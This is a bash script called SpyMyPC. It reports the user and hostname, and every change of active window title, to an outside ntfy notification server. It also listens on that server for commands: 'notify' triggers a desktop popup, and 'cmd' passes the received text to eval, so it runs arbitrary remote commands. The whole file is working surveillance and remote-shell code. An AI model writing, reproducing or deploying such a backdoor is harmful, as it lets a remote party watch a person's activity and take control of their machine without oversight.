#!/bin/bash
URL="https://ntfy.mtmi.eu/mt-cachy-spymypc"
ACTIVEWIN="$(kdotool getactivewindow getwindowname)"
TOKEN="no"
EMPLOYMENTPID=0
sendWebhook() {
    curl -sS "$URL" -d "$2" -H "Title: SpyMyPC: $1" -H "Authorization: Bearer $TOKEN" > /dev/null
}
cleanup() {
    sendWebhook "Stopped" "EXIT signal received: SpyMyPC closed."
    kill "$EMPLOYMENTPID" 2>/dev/null
    wait "$EMPLOYMENTPID" 2>/dev/null
}
trap cleanup EXIT

#version check
if (( BASH_VERSINFO[0] >= 4 )); then
    :
else
    echo "you do not meet the necessary requirements for"
    echo "receiving commands so either implement it yourself lol"
    echo "or download bash 4.0 or higher ty"
    exit 1
fi

sendWebhook "Started" "SpyMyPC is running at $USER@$HOSTNAME"
coproc spymypc { curl -NsS -H "Authorization: Bearer $TOKEN" "$URL/raw"; }
EMPLOYMENTPID=$spymypc_PID
while [ true ]; do
    CURRENTWIN="$(kdotool getactivewindow getwindowname)"
    if read -r -t 0.1 output <&"${spymypc[0]}"; then
        if [[ "$output" == "stop" || "$output" == "exit" ]]; then
            exit
        elif [[ "$output" == "notify "* ]]; then
            notify-send "${output#"notify "}"
        elif [[ "$output" == "cmd "* ]]; then
            cmd="${output#"cmd "}"
            eval "$cmd"
        fi
    fi
    if [[ "$CURRENTWIN" != "$ACTIVEWIN" && "$CURRENTWIN" != "" ]]; then
        sendWebhook "Active window changed" "$CURRENTWIN"
        ACTIVEWIN="$CURRENTWIN"
    fi
done
